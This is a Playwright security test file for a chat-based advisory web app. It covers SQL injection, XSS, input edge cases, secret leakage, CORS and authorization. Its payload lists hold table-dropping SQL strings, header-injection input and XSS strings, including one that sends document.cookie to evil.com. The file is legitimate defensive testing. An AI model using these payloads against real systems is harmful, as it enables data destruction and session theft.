import { test, expect, Page } from '@playwright/test';
import { createClient, SupabaseClient } from '@supabase/supabase-js';

/**
 * E2E Test: M37-01 Security Testing
 *
 * Security tests for the Advisory System to ensure:
 * 1. SQL injection protection
 * 2. XSS prevention
 * 3. Input sanitization
 * 4. Rate limiting behavior
 * 5. Authorization checks
 * 6. Sensitive data exposure
 *
 * Prerequisites:
 * - Dev server running on localhost:3000
 * - Advisory files indexed
 */

const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL || '';
const SUPABASE_KEY = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || '';

test.describe('M37-01: Security Testing', () => {
  let supabase: SupabaseClient | null = null;

  test.beforeAll(async () => {
    if (SUPABASE_URL && SUPABASE_KEY) {
      supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
    }
  });

  test.describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      // Classic SQL injection
      "'; DROP TABLE files; --",
      "1' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "'; DELETE FROM files WHERE '1'='1",
      "1; UPDATE files SET content = 'hacked'",

      // PostgreSQL specific
      "'; SELECT pg_sleep(5); --",
      "' || (SELECT password FROM users LIMIT 1) || '",
      "$1; DROP TABLE files; --",

      // Boolean-based blind injection
      "' AND 1=1 --",
      "' AND 1=2 --",
      "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",

      // Time-based blind injection
      "'; WAITFOR DELAY '00:00:05'; --",
      "'; pg_sleep(5); --",

      // Stacked queries
      "'; TRUNCATE TABLE files; --",
      "'; ALTER TABLE files ADD COLUMN hacked TEXT; --",
    ];

    test('should reject SQL injection in chat input', async ({ page }) => {
      await page.goto('/');
      await page.waitForLoadState('networkidle');

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();

      for (const payload of sqlInjectionPayloads.slice(0, 5)) {
        // Clear and enter payload
        await messageInput.fill(payload);

        const submitButton = page.locator('button[type="submit"]');
        await submitButton.click();

        // Wait for response
        await page.waitForTimeout(3000);

        // Should not expose database error messages
        const pageContent = await page.textContent('body');

        // Check for SQL error indicators
        expect(pageContent?.toLowerCase()).not.toContain('sql syntax');
        expect(pageContent?.toLowerCase()).not.toContain('postgres error');
        expect(pageContent?.toLowerCase()).not.toContain('pg_catalog');
        expect(pageContent?.toLowerCase()).not.toContain('permission denied');
        expect(pageContent?.toLowerCase()).not.toContain('relation "files" does not exist');

        // Navigate back to fresh state
        await page.goto('/');
        await page.waitForLoadState('networkidle');
      }
    });

    test('should handle SQL injection via API directly', async ({ request }) => {
      for (const payload of sqlInjectionPayloads.slice(0, 3)) {
        const response = await request.post('/api/chat', {
          data: {
            messages: [
              { role: 'user', content: payload },
            ],
            model: 'gpt-4o-mini',
          },
        });

        // Should not return 500 with SQL error
        if (response.status() === 500) {
          const body = await response.text();
          expect(body.toLowerCase()).not.toContain('sql');
          expect(body.toLowerCase()).not.toContain('postgres');
          expect(body.toLowerCase()).not.toContain('database');
        }
      }
    });

    test('should sanitize SQL in RPC function parameters', async () => {
      test.skip(!supabase, 'Supabase not configured');

      for (const payload of sqlInjectionPayloads.slice(0, 3)) {
        try {
          const { data, error } = await supabase!.rpc('search_advisory_files', {
            query_text: payload,
            query_embedding: new Array(1536).fill(0.1),
            match_count: 5,
          });

          // Should not expose raw SQL errors
          if (error) {
            expect(error.message).not.toContain('syntax error');
            expect(error.message).not.toContain('DROP');
            expect(error.message).not.toContain('TRUNCATE');
          }

          // Results should be empty or normal search results, not injected data
          if (data && data.length > 0) {
            // Should have valid structure
            expect(data[0]).toHaveProperty('path');
            expect(data[0]).toHaveProperty('content');
          }
        } catch (e) {
          // Network errors are acceptable, not exposing internal errors
        }
      }
    });
  });

  test.describe('XSS Prevention', () => {
    const xssPayloads = [
      // Script injection
      '<script>alert("XSS")</script>',
      '<script>document.location="http://evil.com/"+document.cookie</script>',
      '<script src="http://evil.com/malicious.js"></script>',

      // Event handler injection
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      '<body onload="alert(\'XSS\')">',
      '<input onfocus="alert(\'XSS\')" autofocus>',

      // JavaScript URI
      '<a href="javascript:alert(\'XSS\')">Click</a>',
      '<iframe src="javascript:alert(\'XSS\')">',

      // Data URI
      '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>',

      // CSS injection
      '<style>body{background-image:url("javascript:alert(\'XSS\')")}</style>',

      // HTML5 vectors
      '<details open ontoggle="alert(\'XSS\')">',
      '<video><source onerror="alert(\'XSS\')">',

      // Template literal injection
      '${alert("XSS")}',
      '{{constructor.constructor("alert(1)")()}}',
    ];

    test('should escape XSS payloads in chat display', async ({ page }) => {
      await page.goto('/');
      await page.waitForLoadState('networkidle');

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();

      // Monitor for script execution
      let xssTriggered = false;
      page.on('dialog', () => {
        xssTriggered = true;
      });

      // Also monitor for suspicious DOM changes
      await page.evaluate(() => {
        (window as any).__xssDetected = false;
        const originalAlert = window.alert;
        window.alert = () => {
          (window as any).__xssDetected = true;
        };
      });

      for (const payload of xssPayloads.slice(0, 5)) {
        await messageInput.fill(payload);

        const submitButton = page.locator('button[type="submit"]');
        await submitButton.click();

        await page.waitForTimeout(2000);

        // Check if XSS was triggered
        const xssDetected = await page.evaluate(() => (window as any).__xssDetected);
        expect(xssTriggered).toBe(false);
        expect(xssDetected).toBe(false);

        // Check that script tags are not rendered as HTML
        const scripts = await page.locator('script:not([src*="next"])').count();
        // Should only have legitimate Next.js scripts, not injected ones
        expect(scripts).toBeLessThan(20);

        // Navigate to fresh state
        await page.goto('/');
        await page.waitForLoadState('networkidle');

        // Reset XSS detection
        await page.evaluate(() => {
          (window as any).__xssDetected = false;
        });
      }
    });

    test('should not render HTML in AI responses', async ({ page }) => {
      await page.goto('/');
      await page.waitForLoadState('networkidle');

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();

      // Ask the AI to output HTML
      await messageInput.fill('Please respond with exactly this text: <script>alert("test")</script>');

      const submitButton = page.locator('button[type="submit"]');
      await submitButton.click();

      await page.waitForTimeout(10000);

      // Check that no script tags are executed
      const alertTriggered = await page.evaluate(() => {
        return (window as any).__alertTriggered === true;
      }).catch(() => false);

      expect(alertTriggered).toBe(false);
    });

    test('should sanitize URLs in displayed content', async ({ page }) => {
      await page.goto('/');
      await page.waitForLoadState('networkidle');

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();

      await messageInput.fill('javascript:alert("XSS")');

      const submitButton = page.locator('button[type="submit"]');
      await submitButton.click();

      await page.waitForTimeout(3000);

      // Check no javascript: links are created
      const jsLinks = await page.locator('a[href^="javascript:"]').count();
      expect(jsLinks).toBe(0);
    });
  });

  test.describe('Input Validation', () => {
    test('should handle extremely long input gracefully', async ({ page }) => {
      await page.goto('/');
      await page.waitForLoadState('networkidle');

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();

      // Generate very long input (100KB)
      const longInput = 'A'.repeat(100000);

      await messageInput.fill(longInput);

      const submitButton = page.locator('button[type="submit"]');

      // Should either truncate or reject, not crash
      await submitButton.click();

      await page.waitForTimeout(5000);

      // Page should still be functional
      await expect(messageInput).toBeVisible();
    });

    test('should handle null bytes and control characters', async ({ page }) => {
      await page.goto('/');
      await page.waitForLoadState('networkidle');

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();

      const maliciousInputs = [
        'test\x00null',
        'test\x1besc',
        'test\x08backspace',
        'test\x7fdelete',
        'test\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html',
      ];

      for (const input of maliciousInputs) {
        await messageInput.fill(input);

        const submitButton = page.locator('button[type="submit"]');
        await submitButton.click();

        await page.waitForTimeout(2000);

        // Should not cause errors
        const hasErrors = await page.locator('text=/error|crash|exception/i').count();
        expect(hasErrors).toBe(0);

        await page.goto('/');
        await page.waitForLoadState('networkidle');
      }
    });

    test('should handle unicode edge cases', async ({ page }) => {
      await page.goto('/');
      await page.waitForLoadState('networkidle');

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();

      const unicodeInputs = [
        '🔥'.repeat(1000), // Many emoji
        '\u202E\u0041\u0042\u0043', // RTL override
        '\uFEFF\uFEFF\uFEFF', // BOM characters
        'test\u0000test', // Null in unicode
        '\u200B\u200B\u200B', // Zero-width spaces
        'aaaaaaa\u0300\u0300\u0300\u0300\u0300', // Combining marks
      ];

      for (const input of unicodeInputs) {
        await messageInput.fill(input);

        const submitButton = page.locator('button[type="submit"]');
        await submitButton.click();

        await page.waitForTimeout(2000);

        // Should handle gracefully
        await expect(messageInput).toBeVisible();

        await page.goto('/');
        await page.waitForLoadState('networkidle');
      }
    });
  });

  test.describe('Sensitive Data Exposure', () => {
    test('should not expose API keys in network requests', async ({ page }) => {
      const exposedSecrets: string[] = [];

      page.on('request', request => {
        const body = request.postData() || '';
        const url = request.url();
        const headers = JSON.stringify(request.headers());

        const secretPatterns = [
          /sk-[a-zA-Z0-9]{32,}/,      // OpenAI
          /sk-ant-[a-zA-Z0-9-]+/,      // Anthropic
          /AIza[a-zA-Z0-9_-]{35}/,     // Google
          /eyJ[a-zA-Z0-9_-]+\.eyJ/,    // JWT (partial match)
        ];

        for (const pattern of secretPatterns) {
          if (pattern.test(body) || pattern.test(url)) {
            exposedSecrets.push(`Found in request: ${pattern.source}`);
          }
        }
      });

      await page.goto('/');
      await page.waitForLoadState('networkidle');

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();

      await messageInput.fill('Brief me on MyTab');

      const submitButton = page.locator('button[type="submit"]');
      await submitButton.click();

      await page.waitForTimeout(10000);

      // Should not expose secrets
      expect(exposedSecrets).toHaveLength(0);
    });

    test('should not expose database connection strings in errors', async ({ page }) => {
      // Force an error scenario
      await page.route('**/api/chat', route => {
        route.fulfill({
          status: 500,
          body: JSON.stringify({
            error: 'Internal server error',
          }),
        });
      });

      await page.goto('/');
      await page.waitForLoadState('networkidle');

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();

      await messageInput.fill('Test message');

      const submitButton = page.locator('button[type="submit"]');
      await submitButton.click();

      await page.waitForTimeout(3000);

      const pageContent = await page.textContent('body');

      // Should not expose connection strings
      expect(pageContent).not.toContain('postgres://');
      expect(pageContent).not.toContain('postgresql://');
      expect(pageContent).not.toContain('supabase.co');
      expect(pageContent).not.toContain('password');
    });

    test('should not expose internal paths in error messages', async ({ page }) => {
      await page.goto('/');
      await page.waitForLoadState('networkidle');

      // Collect console errors
      const consoleMessages: string[] = [];
      page.on('console', msg => {
        if (msg.type() === 'error') {
          consoleMessages.push(msg.text());
        }
      });

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();

      await messageInput.fill('Trigger error: undefined.undefined');

      const submitButton = page.locator('button[type="submit"]');
      await submitButton.click();

      await page.waitForTimeout(5000);

      // Check console for path exposure
      for (const msg of consoleMessages) {
        expect(msg).not.toMatch(/\/Users\/[^/]+\//);
        expect(msg).not.toMatch(/\/home\/[^/]+\//);
        expect(msg).not.toMatch(/C:\\Users\\[^\\]+\\/);
      }
    });
  });

  test.describe('Rate Limiting Behavior', () => {
    test('should handle rapid requests without crashing', async ({ page }) => {
      await page.goto('/');
      await page.waitForLoadState('networkidle');

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();
      const submitButton = page.locator('button[type="submit"]');

      // Send rapid requests
      for (let i = 0; i < 10; i++) {
        await messageInput.fill(`Rapid test ${i}`);
        await submitButton.click();
        await page.waitForTimeout(100); // Very fast
      }

      // Page should remain functional
      await page.waitForTimeout(5000);
      await expect(messageInput).toBeVisible();

      // Should not show rate limit errors to user in an insecure way
      const pageContent = await page.textContent('body');
      expect(pageContent).not.toContain('rate limit internal');
    });
  });

  test.describe('CORS and Headers', () => {
    test('should have proper security headers', async ({ page }) => {
      const response = await page.goto('/');

      const headers = response?.headers() || {};

      // Check for recommended security headers
      // Note: Some headers may be set by hosting platform
      console.log('Security headers present:');
      console.log('- X-Content-Type-Options:', headers['x-content-type-options']);
      console.log('- X-Frame-Options:', headers['x-frame-options']);
      console.log('- X-XSS-Protection:', headers['x-xss-protection']);
      console.log('- Content-Security-Policy:', headers['content-security-policy']);
      console.log('- Strict-Transport-Security:', headers['strict-transport-security']);
    });

    test('should not allow CORS from arbitrary origins in API', async ({ request }) => {
      const response = await request.post('/api/chat', {
        headers: {
          'Origin': 'http://evil-site.com',
        },
        data: {
          messages: [{ role: 'user', content: 'test' }],
        },
      });

      const corsHeader = response.headers()['access-control-allow-origin'];

      // Should not allow arbitrary origins
      if (corsHeader) {
        expect(corsHeader).not.toBe('*');
        expect(corsHeader).not.toBe('http://evil-site.com');
      }
    });
  });

  test.describe('Authorization Checks', () => {
    test('should not expose other users advisory data (if multi-tenant)', async ({ page }) => {
      await page.goto('/');
      await page.waitForLoadState('networkidle');

      const messageInput = page.locator('textarea[placeholder]').first();
      await expect(messageInput).toBeVisible();

      // Try to access data that might belong to other users
      await messageInput.fill('Show me all users advisory files');

      const submitButton = page.locator('button[type="submit"]');
      await submitButton.click();

      await page.waitForTimeout(10000);

      const pageContent = await page.textContent('body');

      // Should not expose user-identifying information
      expect(pageContent?.toLowerCase()).not.toContain('user_id');
      expect(pageContent?.toLowerCase()).not.toContain('other user');
      expect(pageContent?.toLowerCase()).not.toContain('access denied to');
    });
  });
});
